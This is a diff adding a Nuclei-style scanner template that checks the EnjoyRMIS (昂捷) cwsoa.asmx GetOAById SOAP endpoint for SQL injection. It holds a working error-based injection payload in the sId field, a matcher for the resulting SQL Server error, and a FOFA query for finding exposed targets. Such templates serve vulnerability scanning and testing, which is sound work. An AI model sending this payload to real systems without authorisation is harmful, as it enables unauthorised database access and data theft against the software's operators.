@@ -1,0 +1,44 @@
+id: enjoyit-cwsoa-sqli
+info:
+  name: 昂捷 cwsoa.asmx - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/3731c2067d80483223603737037eff2ed3c44425/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="CheckSilverlightInstalled"
+  tags: sqli,enjoyit
+
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        SOAPAction: "http://tempuri.org/GetOAById"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetOAById xmlns="http://tempuri.org/">
+              <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
+            </GetOAById>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qqqzq1qvkqq"
+          - "转换成数据类型"
+        condition: and
+
+      - type: status
+        status:
+          - 500
